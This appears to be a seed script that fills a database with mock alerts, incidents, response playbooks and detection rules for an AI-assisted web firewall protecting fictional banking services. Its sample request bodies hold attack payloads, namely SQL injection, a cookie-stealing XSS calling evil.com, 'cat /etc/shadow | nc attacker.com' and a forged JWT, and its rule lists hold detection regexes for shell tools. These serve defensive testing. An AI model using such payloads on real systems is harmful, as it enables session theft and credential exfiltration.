const mongoose = require('mongoose');
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27018/aria_db';

const now = new Date();
function rta(hours) { return new Date(now.getTime() - Math.floor(Math.random() * hours * 3600000)); }
function rid(prefix, i) { return `${prefix}-${String(i).padStart(4,'0')}`; }
function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function rand(min, max) { return Math.round((Math.random() * (max - min) + min) * 100) / 100; }

const ips = ['103.45.12.99','45.22.19.111','192.168.1.105','55.10.122.9','99.102.33.21','185.199.108.153','11.22.33.44','203.0.113.50','198.51.100.22','91.198.174.192','172.16.0.55','10.0.0.99','78.46.91.171','159.89.14.100','64.233.160.0','23.94.12.88','185.220.101.1','162.247.74.7','31.13.24.6','52.14.88.201'];
const paths = ['/api/login','/api/transfer','/api/accounts/balance','/api/users/profile','/api/admin/config','/api/reports','/api/payments','/api/cards/activate','/api/kyc/verify','/api/beneficiary/add','/api/otp/verify','/api/statements','/api/fund-transfer','/api/password/reset','/api/session/validate'];
const cats = ['sqli','xss','credential_stuffing','command_injection','traversal','account_enumeration','session_hijack','api_abuse','privilege_escalation','data_exfiltration','brute_force','none'];
const sevs = ['critical','high','medium','low','info'];
const triages = ['pending','approved','rejected','escalated'];
const methods = ['GET','POST','PUT','DELETE','PATCH'];
const uas = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64)','Mozilla/5.0 (Macintosh; Intel Mac OS X)','curl/7.68.0','PostmanRuntime/7.28.4','python-requests/2.28.0','Mozilla/5.0 (Linux; Android 12)','Scrapy/2.7','Go-http-client/2.0'];
const services = ['Retail Banking Portal','Internal HR System','Mobile Banking API','Payment Gateway','KYC Service'];

const reasonings = {
  sqli: 'SQL injection pattern detected in request body/params. Malicious SQL syntax attempting database manipulation.',
  xss: 'Cross-site scripting payload detected attempting to execute arbitrary JavaScript in user context.',
  credential_stuffing: 'High-velocity authentication attempts from known compromised credential lists detected.',
  command_injection: 'OS command injection payload targeting server-side execution. Shell metacharacters detected.',
  traversal: 'Path traversal attempt to access files outside the web root directory.',
  account_enumeration: 'Sequential account probing detected. Potential reconnaissance for valid user accounts.',
  session_hijack: 'Session token anomaly detected. Possible session fixation or hijacking attempt.',
  api_abuse: 'Abnormal API usage pattern: rate limits exceeded with automated request signatures.',
  privilege_escalation: 'Attempt to access administrative endpoints with insufficient privileges.',
  data_exfiltration: 'Large data export request flagged. Unusual volume of sensitive data retrieval.',
  brute_force: 'Brute force login attempt detected. Multiple failed authentications from same source.',
  none: 'Normal request behavior. No threats detected.'
};

const bodies = {
  sqli: '{"q": "1\' UNION SELECT username,password FROM users--"}',
  xss: '{"bio": "<img src=x onerror=fetch(\'https://evil.com/steal?c=\'+document.cookie)>"}',
  credential_stuffing: '{"username": "admin@bank.com", "password": "Password123!"}',
  command_injection: '{"cmd": "ls; cat /etc/shadow | nc attacker.com 4444"}',
  traversal: '',
  account_enumeration: '',
  session_hijack: '{"token": "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."}',
  api_abuse: '{"batch": true, "ids": [1,2,3,4,5,6,7,8,9,10]}',
  privilege_escalation: '{"role": "admin", "action": "grant_all"}',
  data_exfiltration: '{"export": "all_customers", "format": "csv", "include_pii": true}',
  brute_force: '{"username": "ceo@bank.com", "password": "attempt_847"}',
  none: '{"account": "regular", "amount": 50}'
};

// ============ GENERATE ALERTS ============
const mockAlerts = [];
for (let i = 1; i <= 150; i++) {
  const cat = i <= 10 ? cats[i-1] : pick(cats);
  const sev = cat === 'none' ? pick(['info','low']) : pick(sevs.slice(0, cat === 'sqli' || cat === 'command_injection' ? 2 : 4));
  const dec = cat === 'none' ? 'allow' : (Math.random() > 0.25 ? 'block' : 'allow');
  const fs = cat === 'none' ? rand(1,15) : rand(30,99);
  mockAlerts.push({
    id: rid('req', i),
    timestamp: rta(168),
    sourceIP: pick(ips),
    method: cat === 'traversal' || cat === 'account_enumeration' ? 'GET' : pick(methods),
    path: pick(paths),
    headers: { 'content-type': 'application/json' },
    body: bodies[cat] || '',
    userAgent: pick(uas),
    aiDecision: dec,
    aiReasoning: reasonings[cat],
    detectionSources: cat === 'none' ? ['none'] : [pick(['regex','llm','ueba','anomaly']), ...(Math.random()>0.5?[pick(['regex','llm'])]:[])] ,
    regexMatches: cat === 'none' ? [] : [cat],
    category: cat,
    fidelityScore: fs,
    scores: { regex: rand(0,1), llm: rand(0,1), anomaly: rand(0,1), ueba: rand(0,1) },
    severity: sev,
    triageStatus: pick(triages),
    serviceName: pick(services),
    createdAt: rta(168)
  });
}

// ============ PROTECTED SERVICES ============
const mockApps = [
  { name: "Retail Banking Portal", domain: "retail.bank.local", ports: [{protocol:"https",port:"443"}], upstreams: ["http://10.0.0.51"], type: "Reverse Proxy", defenseMode: "Defense", defenseStatus: true, loggingEnabled: true, aiModel: "mistral", aiSystemPrompt: "You are protecting the retail banking interface from fraud and injection attacks.", createdAt: rta(720) },
  { name: "Internal HR System", domain: "hr.bank.local", ports: [{protocol:"http",port:"80"}], upstreams: ["http://10.0.0.52"], type: "Reverse Proxy", defenseMode: "Audited", defenseStatus: true, loggingEnabled: true, aiModel: "mistral", aiSystemPrompt: "You are protecting an internal HR portal from unauthorized access.", createdAt: rta(720) },
  { name: "Mobile Banking API", domain: "api.mobilebank.local", ports: [{protocol:"https",port:"443"}], upstreams: ["http://10.0.0.53"], type: "Reverse Proxy", defenseMode: "Defense", defenseStatus: true, loggingEnabled: true, aiModel: "mistral", aiSystemPrompt: "You are a security agent protecting mobile banking API endpoints.", createdAt: rta(360) },
  { name: "Payment Gateway", domain: "pay.bank.local", ports: [{protocol:"https",port:"443"}], upstreams: ["http://10.0.0.54"], type: "Reverse Proxy", defenseMode: "Defense", defenseStatus: true, loggingEnabled: true, aiModel: "mistral", aiSystemPrompt: "You are protecting the payment processing gateway.", createdAt: rta(360) },
  { name: "KYC Service", domain: "kyc.bank.local", ports: [{protocol:"https",port:"8443"}], upstreams: ["http://10.0.0.55"], type: "Reverse Proxy", defenseMode: "Audited", defenseStatus: true, loggingEnabled: true, aiModel: "mistral", aiSystemPrompt: "You are protecting the KYC verification service.", createdAt: rta(180) }
];

// ============ INCIDENTS ============
const mockIncidents = [
  { title: "Distributed Credential Stuffing Campaign", description: "Multiple IPs attempting rapid login variations using leaked credential databases. Over 45 unique username/password combinations tried in 2 hours.", category: "credential_stuffing", severity: "critical", status: "investigating", alertIds: [], alertCount: 45, sourceIPs: ["192.168.1.100","203.0.113.45","91.198.174.192"], targetEndpoints: ["/api/login","/api/otp/verify"], attackStage: "reconnaissance", timeRange: {start: rta(48), end: rta(2)}, avgFidelity: 92.5, maxFidelity: 98, correlationRule: "High-Volume Authentication Failures", assignedTo: "Alice_SOC", createdAt: rta(48), updatedAt: rta(2) },
  { title: "SQL Injection on Legacy Portal", description: "Blind SQLi attempts mapped against the legacy reports system. Attacker using time-based blind injection techniques.", category: "sql_injection", severity: "high", status: "open", alertIds: [], alertCount: 12, sourceIPs: ["45.33.22.11"], targetEndpoints: ["/api/reports","/api/statements"], attackStage: "exploitation", timeRange: {start: rta(12), end: rta(1)}, avgFidelity: 89.1, maxFidelity: 94, correlationRule: "SQL Syntax Injection Sequence", createdAt: rta(12), updatedAt: rta(1) },
  { title: "XSS Campaign Targeting User Profiles", description: "Persistent XSS payloads being injected into profile fields to steal session tokens from other users.", category: "xss", severity: "high", status: "investigating", alertIds: [], alertCount: 23, sourceIPs: ["55.10.122.9","78.46.91.171"], targetEndpoints: ["/api/users/profile"], attackStage: "delivery", timeRange: {start: rta(36), end: rta(3)}, avgFidelity: 85.3, maxFidelity: 91, correlationRule: "Repeated XSS Pattern Detection", assignedTo: "Bob_SOC", createdAt: rta(36), updatedAt: rta(3) },
  { title: "Admin Endpoint Command Injection", description: "Targeted command injection attacks on administrative configuration endpoints from Tor exit nodes.", category: "command_injection", severity: "critical", status: "resolved", alertIds: [], alertCount: 8, sourceIPs: ["185.220.101.1","162.247.74.7"], targetEndpoints: ["/api/admin/config"], attackStage: "exploitation", timeRange: {start: rta(72), end: rta(24)}, avgFidelity: 96.2, maxFidelity: 99, correlationRule: "Admin Endpoint Targeting", assignedTo: "Charlie_SOC", resolvedAt: rta(20), resolutionNotes: "Source IPs blocked at network firewall. Admin endpoint moved behind VPN.", createdAt: rta(72), updatedAt: rta(20) },
  { title: "Mobile API Brute Force Attack", description: "Automated brute force attack against mobile banking API authentication endpoint.", category: "brute_force", severity: "high", status: "investigating", alertIds: [], alertCount: 156, sourceIPs: ["23.94.12.88","52.14.88.201","31.13.24.6"], targetEndpoints: ["/api/login","/api/password/reset"], attackStage: "reconnaissance", timeRange: {start: rta(24), end: rta(1)}, avgFidelity: 78.4, maxFidelity: 88, correlationRule: "High-Volume Authentication Failures", assignedTo: "Alice_SOC", createdAt: rta(24), updatedAt: rta(1) },
  { title: "Data Exfiltration Attempt via Export API", description: "Unauthorized bulk export of customer PII data through the statements API.", category: "data_exfiltration", severity: "critical", status: "open", alertIds: [], alertCount: 5, sourceIPs: ["10.0.0.99"], targetEndpoints: ["/api/statements","/api/reports"], attackStage: "exfiltration", timeRange: {start: rta(6), end: rta(1)}, avgFidelity: 94.7, maxFidelity: 97, correlationRule: "Bulk Data Export Detection", createdAt: rta(6), updatedAt: rta(1) },
  { title: "Session Hijacking via Token Manipulation", description: "Attacker manipulating JWT tokens with 'none' algorithm to bypass authentication.", category: "session_hijack", severity: "critical", status: "investigating", alertIds: [], alertCount: 14, sourceIPs: ["159.89.14.100"], targetEndpoints: ["/api/session/validate","/api/fund-transfer"], attackStage: "exploitation", timeRange: {start: rta(18), end: rta(2)}, avgFidelity: 91.0, maxFidelity: 96, correlationRule: "Session Anomaly Detection", assignedTo: "Bob_SOC", createdAt: rta(18), updatedAt: rta(2) },
  { title: "Path Traversal on KYC Documents", description: "Attacker attempting to access KYC documents of other customers via path traversal.", category: "traversal", severity: "high", status: "resolved", alertIds: [], alertCount: 9, sourceIPs: ["172.16.0.55"], targetEndpoints: ["/api/kyc/verify"], attackStage: "exploitation", timeRange: {start: rta(96), end: rta(48)}, avgFidelity: 82.6, maxFidelity: 89, correlationRule: "Path Traversal Pattern", resolvedAt: rta(44), resolutionNotes: "Input validation hardened. Path canonicalization added.", createdAt: rta(96), updatedAt: rta(44) },
  { title: "Privilege Escalation via Role Tampering", description: "Multiple attempts to modify user roles through direct API manipulation.", category: "privilege_escalation", severity: "high", status: "open", alertIds: [], alertCount: 7, sourceIPs: ["64.233.160.0"], targetEndpoints: ["/api/admin/config","/api/users/profile"], attackStage: "installation", timeRange: {start: rta(30), end: rta(5)}, avgFidelity: 87.3, maxFidelity: 93, correlationRule: "Privilege Modification Detection", createdAt: rta(30), updatedAt: rta(5) },
  { title: "API Rate Limit Bypass Campaign", description: "Distributed attack using rotating IPs to bypass API rate limiting on payment endpoints.", category: "api_abuse", severity: "medium", status: "investigating", alertIds: [], alertCount: 67, sourceIPs: ["203.0.113.50","198.51.100.22","23.94.12.88","52.14.88.201"], targetEndpoints: ["/api/payments","/api/cards/activate"], attackStage: "delivery", timeRange: {start: rta(48), end: rta(4)}, avgFidelity: 71.5, maxFidelity: 82, correlationRule: "Distributed Rate Limit Evasion", assignedTo: "Charlie_SOC", createdAt: rta(48), updatedAt: rta(4) },
  { title: "Account Enumeration via Balance API", description: "Sequential probing of account balance endpoints to identify valid account numbers.", category: "account_enumeration", severity: "medium", status: "open", alertIds: [], alertCount: 34, sourceIPs: ["99.102.33.21"], targetEndpoints: ["/api/accounts/balance"], attackStage: "reconnaissance", timeRange: {start: rta(60), end: rta(8)}, avgFidelity: 62.1, maxFidelity: 74, correlationRule: "Sequential Endpoint Probing", createdAt: rta(60), updatedAt: rta(8) },
  { title: "Kill Chain: Recon to Exploitation on Payment System", description: "Coordinated multi-stage attack starting with port scanning, moving to credential stuffing, then SQL injection on payment endpoints.", category: "sql_injection", severity: "critical", status: "investigating", alertIds: [], alertCount: 28, sourceIPs: ["185.199.108.153","185.220.101.1"], targetEndpoints: ["/api/login","/api/payments","/api/fund-transfer"], attackStage: "command_control", timeRange: {start: rta(120), end: rta(6)}, avgFidelity: 95.8, maxFidelity: 99, correlationRule: "Kill Chain Detection", assignedTo: "Alice_SOC", createdAt: rta(120), updatedAt: rta(6) }
];

// ============ PLAYBOOKS ============
const mockPlaybooks = [
  { title: "Credential Stuffing Response Plan", generatedBy: "llm", category: "credential_stuffing", steps: [
    {order:1,action:"Identify all source IPs involved in the campaign and add to temporary blocklist.",assignee:"SOC-L1",estimatedTime:"15m",verification:"Check WAF drop logs for blocked IPs",automated:true,status:"completed",completedAt:rta(1)},
    {order:2,action:"Force password reset for all targeted accounts. Notify affected users via secure channel.",assignee:"IT-Ops",estimatedTime:"2h",verification:"Verify all target accounts have new passwords in AD",automated:false,status:"in_progress"},
    {order:3,action:"Enable enhanced rate limiting on /api/login (max 5 attempts per minute per IP).",assignee:"SOC-L2",estimatedTime:"30m",verification:"Test rate limiting with automated requests",automated:true,status:"pending"},
    {order:4,action:"Review leaked credential databases for additional compromised accounts.",assignee:"SOC-L3",estimatedTime:"4h",verification:"Cross-reference with HaveIBeenPwned API",automated:false,status:"pending"},
    {order:5,action:"Generate post-incident report and update playbook effectiveness score.",assignee:"Management",estimatedTime:"1h",verification:"Report reviewed and signed off",automated:false,status:"pending"}
  ], estimatedResolutionTime:"8h", regulatoryRequirements:["PCI-DSS 8.1.6","RBI CSCRF 5.4","ISO 27001 A.9.4"], status:"in_progress", llmModel:"mistral", llmPrompt:"Generate a NIST 800-61 compliant incident response playbook for a distributed credential stuffing attack targeting banking login endpoints.", createdAt:rta(40), updatedAt:rta(1) },
  { title: "SQL Injection Containment Playbook", generatedBy: "llm", category: "sql_injection", steps: [
    {order:1,action:"Immediately enable WAF virtual patching for detected SQLi patterns.",assignee:"SOC-L1",estimatedTime:"10m",verification:"Confirm WAF rule is active and blocking",automated:true,status:"completed",completedAt:rta(10)},
    {order:2,action:"Audit database access logs for any successful data extraction.",assignee:"SOC-L2",estimatedTime:"2h",verification:"Review DB audit logs for unauthorized SELECT/UNION queries",automated:false,status:"completed",completedAt:rta(8)},
    {order:3,action:"Rotate database credentials and API keys for affected services.",assignee:"IT-Ops",estimatedTime:"1h",verification:"All services reconnect with new credentials",automated:false,status:"in_progress"},
    {order:4,action:"Deploy parameterized query patches to vulnerable endpoints.",assignee:"SOC-L3",estimatedTime:"4h",verification:"Code review confirms no raw SQL concatenation",automated:false,status:"pending"}
  ], estimatedResolutionTime:"8h", regulatoryRequirements:["PCI-DSS 6.5.1","OWASP Top 10 A03"], status:"in_progress", llmModel:"mistral", createdAt:rta(11), updatedAt:rta(8) },
  { title: "XSS Attack Mitigation Plan", generatedBy: "llm", category: "xss", steps: [
    {order:1,action:"Deploy Content-Security-Policy headers on affected endpoints.",assignee:"SOC-L1",estimatedTime:"30m",verification:"CSP headers visible in response",automated:true,status:"completed",completedAt:rta(30)},
    {order:2,action:"Sanitize all stored user-generated content in affected database fields.",assignee:"IT-Ops",estimatedTime:"3h",verification:"Run XSS scanner against cleaned data",automated:false,status:"in_progress"},
    {order:3,action:"Implement output encoding on all user-facing templates.",assignee:"SOC-L2",estimatedTime:"2h",verification:"Automated XSS test suite passes",automated:false,status:"pending"}
  ], estimatedResolutionTime:"6h", regulatoryRequirements:["PCI-DSS 6.5.7","OWASP Top 10 A07"], status:"in_progress", llmModel:"mistral", createdAt:rta(35), updatedAt:rta(2) },
  { title: "Command Injection Emergency Response", generatedBy: "llm", category: "command_injection", steps: [
    {order:1,action:"Immediately isolate affected server from network.",assignee:"SOC-L1",estimatedTime:"5m",verification:"Server unreachable from external network",automated:true,status:"completed",completedAt:rta(70)},
    {order:2,action:"Capture forensic disk image and memory dump.",assignee:"SOC-L3",estimatedTime:"2h",verification:"Forensic images stored in evidence locker",automated:false,status:"completed",completedAt:rta(65)},
    {order:3,action:"Scan for rootkits, backdoors, and persistence mechanisms.",assignee:"SOC-L2",estimatedTime:"4h",verification:"Clean scan results from multiple AV engines",automated:false,status:"completed",completedAt:rta(50)},
    {order:4,action:"Rebuild server from clean image with hardened configuration.",assignee:"IT-Ops",estimatedTime:"6h",verification:"Security baseline compliance check passes",automated:false,status:"completed",completedAt:rta(25)},
    {order:5,action:"Move admin endpoints behind VPN and implement MFA.",assignee:"IT-Ops",estimatedTime:"4h",verification:"Admin endpoints only accessible via VPN",automated:false,status:"completed",completedAt:rta(22)}
  ], estimatedResolutionTime:"18h", regulatoryRequirements:["NIST SP 800-61 Rev.2","PCI-DSS 12.10"], status:"completed", completedAt:rta(20), effectiveness:95, llmModel:"mistral", createdAt:rta(72), updatedAt:rta(20) },
  { title: "Data Exfiltration Response Playbook", generatedBy: "llm", category: "data_exfiltration", steps: [
    {order:1,action:"Disable bulk export API endpoints immediately.",assignee:"SOC-L1",estimatedTime:"5m",verification:"API returns 503 on export endpoints",automated:true,status:"completed",completedAt:rta(5)},
    {order:2,action:"Identify scope of data accessed and potentially exfiltrated.",assignee:"SOC-L2",estimatedTime:"4h",verification:"Complete data access audit report generated",automated:false,status:"in_progress"},
    {order:3,action:"Notify Data Protection Officer and begin breach assessment.",assignee:"Management",estimatedTime:"2h",verification:"DPO acknowledgment received",automated:false,status:"pending"},
    {order:4,action:"Implement data loss prevention (DLP) controls on export APIs.",assignee:"SOC-L3",estimatedTime:"8h",verification:"DLP rules active and tested",automated:false,status:"pending"}
  ], estimatedResolutionTime:"16h", regulatoryRequirements:["GDPR Art.33","PCI-DSS 12.10.5","RBI Master Direction on Cyber Security"], status:"in_progress", llmModel:"mistral", createdAt:rta(5), updatedAt:rta(1) },
  { title: "Session Hijacking Containment Plan", generatedBy: "hybrid", category: "session_hijack", steps: [
    {order:1,action:"Invalidate all active sessions for affected users.",assignee:"SOC-L1",estimatedTime:"10m",verification:"Redis session store cleared for target users",automated:true,status:"completed",completedAt:rta(16)},
    {order:2,action:"Enforce JWT algorithm whitelist (RS256 only).",assignee:"SOC-L2",estimatedTime:"1h",verification:"JWT with 'none' algorithm rejected",automated:true,status:"in_progress"},
    {order:3,action:"Deploy session binding to device fingerprint.",assignee:"IT-Ops",estimatedTime:"4h",verification:"Session invalidated on device change",automated:false,status:"pending"}
  ], estimatedResolutionTime:"6h", regulatoryRequirements:["PCI-DSS 8.2.1","OWASP Session Management"], status:"in_progress", llmModel:"mistral", createdAt:rta(17), updatedAt:rta(2) }
];

// ============ EVOLUTION CHANGES ============
const mockEvolutions = [
  { type:"regex", description:"Added strict Union-Based SQLi pattern", reason:"Missed 3 advanced union-select attacks on reporting portal last week", previousValue:"/union.*select/i", proposedValue:"/(?:union\\s+(?:all\\s+)?select|\\bselect\\b.*?\\bfrom\\b)/i", trigger:"auto_tune", validationScore:98.4, validationDetails:{testCases:1000,passed:984,failed:16,falsePositiveRate:0.01,falseNegativeRate:0.02}, status:"deployed", deployedAt:rta(5), performanceMetrics:{preChangeFPRate:0.05,postChangeFPRate:0.01,preChangeTPRate:0.90,postChangeTPRate:0.98}, affectedModule:"gateway-regex", createdBy:"aria-agent", approvedBy:"Bob_SOC", createdAt:rta(10), updatedAt:rta(5) },
  { type:"threshold", description:"Lowered XSS fidelity threshold from 90 to 85", reason:"XSS campaigns evolving dynamically, needs proactive flagging", previousValue:{xssFidelityRequirement:90}, proposedValue:{xssFidelityRequirement:85}, trigger:"feedback", validationScore:93.0, validationDetails:{testCases:500,passed:465,failed:35,falsePositiveRate:0.04,falseNegativeRate:0.03}, status:"monitoring", monitoringStartedAt:rta(2), affectedModule:"fidelity-weights", createdBy:"aria-agent", createdAt:rta(4), updatedAt:rta(2) },
  { type:"prompt", description:"Improved LLM analysis prompt for credential stuffing detection", reason:"15% false negative rate on slow credential stuffing attacks", previousValue:"Analyze this HTTP request for security threats...", proposedValue:"You are a banking security analyst. Analyze this HTTP request focusing on: 1) Authentication abuse patterns 2) Credential velocity analysis 3) Known credential database signatures 4) Geographic impossibility...", trigger:"feedback", validationScore:96.2, validationDetails:{testCases:800,passed:770,failed:30,falsePositiveRate:0.02,falseNegativeRate:0.015}, status:"deployed", deployedAt:rta(8), performanceMetrics:{preChangeFPRate:0.03,postChangeFPRate:0.02,preChangeTPRate:0.85,postChangeTPRate:0.96}, affectedModule:"llm-analysis", createdBy:"aria-agent", approvedBy:"Alice_SOC", createdAt:rta(14), updatedAt:rta(8) },
  { type:"regex", description:"New pattern for JWT 'none' algorithm attacks", reason:"Session hijacking incidents using alg:none bypass", previousValue:null, proposedValue:"/eyJ[A-Za-z0-9_-]*\\.eyJ[A-Za-z0-9_-]*\\./i", trigger:"auto_tune", validationScore:99.1, validationDetails:{testCases:600,passed:595,failed:5,falsePositiveRate:0.005,falseNegativeRate:0.003}, status:"deployed", deployedAt:rta(3), performanceMetrics:{preChangeFPRate:0,postChangeFPRate:0.005,preChangeTPRate:0,postChangeTPRate:0.99}, affectedModule:"gateway-regex", createdBy:"aria-agent", approvedBy:"Charlie_SOC", createdAt:rta(6), updatedAt:rta(3) },
  { type:"weight", description:"Increased UEBA weight in fidelity scoring", reason:"UEBA consistently catching insider threats that other modules miss", previousValue:{ueba:0.25}, proposedValue:{ueba:0.30}, trigger:"scheduled", validationScore:91.5, validationDetails:{testCases:2000,passed:1830,failed:170,falsePositiveRate:0.05,falseNegativeRate:0.035}, status:"validated", validatedAt:rta(1), performanceMetrics:{preChangeFPRate:0.06,postChangeFPRate:0.05,preChangeTPRate:0.88,postChangeTPRate:0.91}, affectedModule:"fidelity-weights", createdBy:"aria-agent", createdAt:rta(7), updatedAt:rta(1) },
  { type:"model", description:"Fine-tuned Mistral model v2 (aria-policeman-v2)", reason:"Accumulated 200+ analyst-confirmed decisions for training", previousValue:"mistral:latest", proposedValue:"aria-policeman-v2", trigger:"scheduled", validationScore:94.8, validationDetails:{testCases:1500,passed:1422,failed:78,falsePositiveRate:0.03,falseNegativeRate:0.022}, status:"deployed", deployedAt:rta(12), performanceMetrics:{preChangeFPRate:0.08,postChangeFPRate:0.03,preChangeTPRate:0.82,postChangeTPRate:0.95}, affectedModule:"ollama-model", createdBy:"aria-agent", approvedBy:"Alice_SOC", createdAt:rta(20), updatedAt:rta(12) },
  { type:"pipeline", description:"Added geographic anomaly detector module", reason:"Impossible travel attacks bypassing existing detection", previousValue:null, proposedValue:"GeoAnomalyDetector_v1", trigger:"manual", validationScore:88.3, validationDetails:{testCases:400,passed:353,failed:47,falsePositiveRate:0.08,falseNegativeRate:0.04}, status:"monitoring", monitoringStartedAt:rta(3), affectedModule:"pipeline-modules", createdBy:"analyst", createdAt:rta(5), updatedAt:rta(3) },
  { type:"regex", description:"Improved path traversal detection for encoded payloads", reason:"Attackers using double URL encoding to bypass traversal detection", previousValue:"/\\.\\.\\/|\\.\\.\\\\./i", proposedValue:"/(?:%2e%2e%2f|%252e%252e%252f|\\.\\.\\/|\\.\\.\\\\.)/i", trigger:"auto_tune", validationScore:97.6, validationDetails:{testCases:750,passed:732,failed:18,falsePositiveRate:0.015,falseNegativeRate:0.009}, status:"deployed", deployedAt:rta(15), performanceMetrics:{preChangeFPRate:0.04,postChangeFPRate:0.015,preChangeTPRate:0.87,postChangeTPRate:0.97}, affectedModule:"gateway-regex", createdBy:"aria-agent", approvedBy:"Bob_SOC", createdAt:rta(18), updatedAt:rta(15) },
  { type:"threshold", description:"Raised minimum fidelity for auto-block to 85", reason:"Reducing false positive blocks on legitimate high-value transactions", previousValue:{autoBlockThreshold:75}, proposedValue:{autoBlockThreshold:85}, trigger:"threshold_breach", validationScore:90.2, validationDetails:{testCases:1200,passed:1082,failed:118,falsePositiveRate:0.06,falseNegativeRate:0.04}, status:"deployed", deployedAt:rta(25), affectedModule:"gateway-enforcement", createdBy:"aria-agent", createdAt:rta(30), updatedAt:rta(25) },
  { type:"prompt", description:"Enhanced playbook generation with RBI compliance references", reason:"Playbooks missing India-specific regulatory requirements", previousValue:"Generate incident response steps for {attack_type}...", proposedValue:"Generate a NIST 800-61 compliant incident response playbook for {attack_type}. Include specific references to PCI-DSS, RBI CSCRF, and ISO 27001 requirements applicable to Indian banking sector...", trigger:"manual", validationScore:92.0, validationDetails:{testCases:100,passed:92,failed:8,falsePositiveRate:0,falseNegativeRate:0}, status:"validated", validatedAt:rta(10), affectedModule:"playbook-generator", createdBy:"analyst", approvedBy:"Alice_SOC", createdAt:rta(15), updatedAt:rta(10) },
  { type:"regex", description:"Rolled back overly aggressive XSS pattern", reason:"Pattern was matching legitimate HTML in CMS content, causing 12% false positive rate", previousValue:"/(?:<[^>]*(?:on\\w+|style|src)\\s*=)/i", proposedValue:"/(?:<script|<iframe|javascript:|vbscript:|data:text\\/html)/i", trigger:"auto_tune", validationScore:72.0, validationDetails:{testCases:1000,passed:720,failed:280,falsePositiveRate:0.12,falseNegativeRate:0.16}, status:"rolled_back", rolledBackAt:rta(2), rollbackReason:"False positive rate exceeded 10% threshold. Reverted to previous pattern.", affectedModule:"gateway-regex", createdBy:"aria-agent", createdAt:rta(5), updatedAt:rta(2) }
];

// ============ LEARNED PATTERNS ============
const mockLearnedPatterns = [
  { pattern:"(?i)(?:<script.*?>|onload=|onerror=)", flags:"ig", category:"xss", description:"Matches common inline JavaScript execution vectors including event handlers", confidence:0.92, source:"evolved", generatedFrom:["req-0004","req-0023"], validationResults:{truePositives:420,falsePositives:2,trueNegatives:5000,falseNegatives:12}, status:"active", deployedAt:rta(24), hitCount:145, falsePositiveCount:1, createdAt:rta(30), updatedAt:rta(24) },
  { pattern:"(?:union\\s+(?:all\\s+)?select|select.*from.*where)", flags:"ig", category:"sqli", description:"Detects UNION-based and complex SELECT-FROM-WHERE SQL injection patterns", confidence:0.96, source:"evolved", generatedFrom:["req-0001","req-0015"], validationResults:{truePositives:680,falsePositives:5,trueNegatives:8000,falseNegatives:8}, status:"active", deployedAt:rta(48), hitCount:312, falsePositiveCount:3, createdAt:rta(60), updatedAt:rta(48) },
  { pattern:"(?:;\\s*(?:cat|ls|whoami|id|wget|curl|nc)\\s)", flags:"ig", category:"command_injection", description:"Catches common OS command chaining with shell utilities", confidence:0.94, source:"ai_generated", generatedFrom:["req-0007"], validationResults:{truePositives:290,falsePositives:1,trueNegatives:6000,falseNegatives:4}, status:"active", deployedAt:rta(72), hitCount:89, falsePositiveCount:0, createdAt:rta(80), updatedAt:rta(72) },
  { pattern:"(?:%2e%2e%2f|%252e%252e%252f|\\.\\.\\/)", flags:"ig", category:"traversal", description:"Detects path traversal including URL-encoded and double-encoded variants", confidence:0.91, source:"evolved", generatedFrom:["req-0003","req-0042"], validationResults:{truePositives:195,falsePositives:8,trueNegatives:4500,falseNegatives:15}, status:"active", deployedAt:rta(96), hitCount:67, falsePositiveCount:4, createdAt:rta(100), updatedAt:rta(96) },
  { pattern:"eyJ[A-Za-z0-9_-]*\\.eyJ[A-Za-z0-9_-]*\\.", flags:"g", category:"session_hijack", description:"Detects JWT tokens with suspicious structure (potential alg:none attack)", confidence:0.88, source:"ai_generated", generatedFrom:["req-0089"], validationResults:{truePositives:52,falsePositives:15,trueNegatives:3000,falseNegatives:3}, status:"active", deployedAt:rta(48), hitCount:28, falsePositiveCount:8, createdAt:rta(55), updatedAt:rta(48) },
  { pattern:"(?:(?:password|passwd|pwd)\\s*[:=]\\s*['\"])", flags:"ig", category:"credential_stuffing", description:"Detects plaintext credential submission patterns in request bodies", confidence:0.85, source:"evolved", generatedFrom:["req-0002","req-0030","req-0031"], validationResults:{truePositives:340,falsePositives:22,trueNegatives:7000,falseNegatives:28}, status:"active", deployedAt:rta(120), hitCount:456, falsePositiveCount:15, createdAt:rta(130), updatedAt:rta(120) },
  { pattern:"(?:export.*(?:csv|json|xml).*(?:all|bulk|pii))", flags:"ig", category:"data_exfiltration", description:"Detects bulk data export requests with PII indicators", confidence:0.79, source:"ai_generated", generatedFrom:["req-0110"], validationResults:{truePositives:18,falsePositives:6,trueNegatives:2000,falseNegatives:2}, status:"testing", hitCount:0, falsePositiveCount:0, createdAt:rta(10), updatedAt:rta(10) },
  { pattern:"(?:role|admin|privilege).*(?:grant|elevate|modify)", flags:"ig", category:"privilege_escalation", description:"Detects privilege escalation attempts through role manipulation in API requests", confidence:0.82, source:"ai_generated", generatedFrom:["req-0088","req-0095"], validationResults:{truePositives:45,falsePositives:12,trueNegatives:3500,falseNegatives:8}, status:"active", deployedAt:rta(36), hitCount:34, falsePositiveCount:6, createdAt:rta(45), updatedAt:rta(36) },
  { pattern:"(?:\\b(?:0x[0-9a-f]+|char\\(|concat\\(|group_concat))", flags:"ig", category:"sqli", description:"Detects hex-encoded and function-based SQL injection techniques", confidence:0.90, source:"evolved", generatedFrom:["req-0056","req-0058"], validationResults:{truePositives:210,falsePositives:4,trueNegatives:5500,falseNegatives:10}, status:"active", deployedAt:rta(60), hitCount:78, falsePositiveCount:2, createdAt:rta(68), updatedAt:rta(60) },
  { pattern:"(?:(?:bot|spider|crawler|scraper|scan))", flags:"ig", category:"api_abuse", description:"Identifies automated bot and scraper user agents", confidence:0.72, source:"human_created", generatedFrom:[], validationResults:{truePositives:650,falsePositives:85,trueNegatives:9000,falseNegatives:120}, status:"active", deployedAt:rta(168), hitCount:890, falsePositiveCount:45, createdAt:rta(180), updatedAt:rta(168) },
